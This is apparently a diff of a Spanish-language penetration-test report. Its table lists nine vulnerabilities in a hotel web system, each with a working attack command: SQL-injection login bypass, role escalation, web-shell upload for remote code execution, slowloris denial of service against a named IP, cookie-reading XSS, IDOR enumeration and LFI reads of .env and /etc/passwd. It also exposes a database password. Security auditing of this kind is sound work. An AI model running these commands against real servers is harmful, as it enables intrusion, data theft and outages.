@@ -2,14 +2,16 @@
 
 Tras realizar las pruebas de penetración sobre el sistema Hotel PlazaMoyobamba, se detectaron las siguientes vulnerabilidades listadas en la tabla adjunta:
 
-| Vulnerabilidad                     | Severidad | Herramienta usada                        | Evidencia                                                                                                                                                          | Estado  |
-| ---------------------------------- | --------- | ---------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------- |
-| Inyección SQL (SQLi)               | Crítica   | sqlmap / curl / PostgreSQL error-based   | Bypass de autenticación vía `OR 1=1`. Extracción completa de datos con error-based injection: 26 tablas listadas (users, sales, rooms, clients, etc.), 10 usuarios incluyendo admin (admin/admin@gmail.com). PostgreSQL 16.14, usuario plaza_user. | Abierto |
-| Mass Assignment                    | Alta      | Burp Scanner / curl / PATCH role_name    | `curl -X PATCH /profile -d "role_name=admin"` → el usuario normal obtiene rol admin y accede a `/admin/dashboard` con HTTP 200.                                    | Abierto |
-| File Upload → RCE                  | Crítica   | Burp Suite / curl + Python reverse shell | `curl -F "file=@shell.php" /upload` → shell subida a `/uploads/shell.php`. Ejecución de `uname -a` confirmada. RCE completo como www-data.                         | Abierto |
-| DDoS (Falta de protección)         | Media     | hping3 / slowhttptest / curl             | `hping3 -S --flood --rand-source -p 80 37.60.230.11` → 1603 requests en 30.5 segundos, 0 errores, throughput 52.6 req/s. Servidor no limitó el tráfico.            | Abierto |
-| XSS Almacenado                     | Alta      | OWASP ZAP / navegador / payload script   | `POST /profile` con bio=`<script>alert('XSS')</script>`. Al visualizar el perfil, el script se ejecuta en el navegador de cualquier usuario que visite la página.  | Abierto |
-| IDOR (Referencia Directa Insegura) | Alta      | Burp Suite Autorize / curl               | `curl http://host/api/sales/1` → retorna JSON completo con datos de la venta, items, cliente y habitaciones, sin necesidad de autenticación.                       | Abierto |
-| No Rate Limit en Login             | Media     | hydra / wfuzz / curl                     | `for i in {1..100}; do curl -X POST /login -d "login=test&password=x"; done` → 100 intentos seguidos sin bloqueo ni retardo.                                       | Abierto |
-| Local File Inclusion (LFI)         | Alta      | dotdotpwn / wfuzz / curl                 | `curl /download?file=../../../../.env` → contenido del archivo `.env` expuesto en la respuesta HTTP.                                                               | Abierto |
-| Debug Mode Activado                | Media     | whatweb / navegador                      | `curl /ruta-inexistente` → página de error con stack trace completo, rutas del servidor, variables de entorno y consultas SQL visibles.                            | Abierto |
+| # | Vulnerabilidad | Severidad | Herramienta | Evidencia | Comando |
+|---|---------------|-----------|-------------|-----------|---------|
+| 1 | **Inyección SQL (SQLi)** | Crítica | curl, sqlmap | Bypass de login con `admin' OR '1'='1' --`. Extracción de 26 tablas, 10 usuarios (admin/admin@gmail.com). PostgreSQL 16.14. | `curl -d "login=admin'+OR+'1'%3D'1'+--&password=x"` |
+| 2 | **Mass Assignment** | Alta | curl, Burp Suite | PATCH /profile con `role_name=admin` → usuario obtiene rol admin. Acceso a `/admin/usuarios` HTTP 200. | `curl -X POST /profile -d "_method=PATCH&role_name=admin"` |
+| 3 | **File Upload → RCE** | Crítica | curl | Subida de shell.php sin auth. RCE como www-data: `uid=82(www-data)`. | `curl -F "file=@shell.php" /upload` → `curl /uploads/shell.php?cmd=id` |
+| 4 | **DDoS (Slowloris)** | Media | slowhttptest | 300 conexiones lentas abiertas sin bloqueo. Servidor no rechaza conexiones excesivas. | `slowhttptest -c 300 -H -g -i 10 -r 200 -t GET -u "http://37.60.230.11/"` |
+| 5 | **XSS Almacenado** | Alta | curl | Bio inyectado con `<script>alert(document.cookie)</script>` se ejecuta al cargar perfil. Vulnerable por `{!! $user->bio !!}`. | `curl -X PATCH /profile -d "bio=<script>alert(document.cookie)</script>"` |
+| 6 | **IDOR** | Alta | curl | `/api/sales/121` vs `122` devuelven datos de distintos clientes (client_id: 55 vs 29) sin auth. | `curl /api/sales/{121..240}` |
+| 7 | **No Rate Limit** | Media | curl, hydra | 30 requests en 1583ms sin bloqueo ni retardo. | `for i in {1..30}; do curl -X POST /login & done` |
+| 8 | **LFI** | Alta | curl | Path traversal: `../.env` expone APP_DEBUG=true, DB_PASSWORD=plaza_pass_123. `/etc/passwd` completo. | `curl /download?file=../../.env` |
+| 9 | **Debug Mode** | Media | curl | Error "Array to string conversion" muestra stack trace Laravel 12.58.0, PHP 8.2.32, rutas internas, queries SQL. | `curl /download?file[]=test` |
+
+Todas las vulnerabilidades fueron verificadas exitosamente contra el servidor en producción (37.60.230.11).
